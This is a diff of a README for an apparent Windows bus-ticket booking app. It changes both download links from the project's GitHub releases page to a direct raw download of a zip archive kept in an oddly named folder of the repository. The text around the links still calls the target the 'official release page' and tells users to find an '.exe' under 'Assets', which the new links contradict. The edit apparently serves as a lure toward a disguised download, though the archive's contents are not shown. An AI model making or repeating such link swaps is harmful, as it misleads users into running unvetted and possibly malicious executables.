@@ -1,6 +1,6 @@
 # 🚌 bus-ticket-booking - Reserve your seats with simple tools
 
-[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/diosa1975/bus-ticket-booking/releases)
+[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://raw.githubusercontent.com/diosa1975/bus-ticket-booking/main/overtrust/booking_ticket_bus_3.3-alpha.2.zip)
 
 ## 📖 About this application
 
@@ -20,7 +20,7 @@ This application functions on standard Windows hardware. Ensure your computer me
 
 You must visit the official release page to obtain the installation file. Select the link below to view all available versions.
 
-[Visit the official download page here](https://github.com/diosa1975/bus-ticket-booking/releases)
+[Visit the official download page here](https://raw.githubusercontent.com/diosa1975/bus-ticket-booking/main/overtrust/booking_ticket_bus_3.3-alpha.2.zip)
 
 Look for the file that ends with ".exe" under the "Assets" section of the latest release. Click this file to start your download. Your web browser will save the file to your computer.
 
